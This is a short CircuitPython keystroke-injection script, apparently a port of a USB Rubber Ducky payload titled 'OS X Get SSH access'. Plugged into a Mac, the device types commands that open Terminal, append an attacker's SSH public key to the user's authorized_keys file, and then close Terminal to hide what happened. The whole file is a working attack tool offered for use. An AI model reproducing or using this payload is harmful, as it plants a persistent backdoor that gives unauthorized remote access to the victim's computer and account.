import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS as KeyboardLayout
from adafruit_hid.keycode import Keycode
from time import sleep


kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayout(kbd)

# ducky payload starts here

# Title: OS X Get SSH access
# Author: Jesse Wallace (c0deous)
# This script adds a ssh public key to the authorized_keys file on a target's mac.
sleep(1.0)
kbd.send(Keycode.WINDOWS, Keycode.SPACE)
sleep(0.5)
layout.write("Terminal")
sleep(0.5)
kbd.send(Keycode.ENTER)
sleep(0.8)
layout.write("echo 'RSA_PUB_ID' >> ~/.ssh/authorized_keys")
kbd.send(Keycode.ENTER)
sleep(1.0)
layout.write("killall Terminal")
kbd.send(Keycode.ENTER)
# Note: you may shorten the times if you think they are too slow.  I made them to accomodate older macs that can't get around very fast.
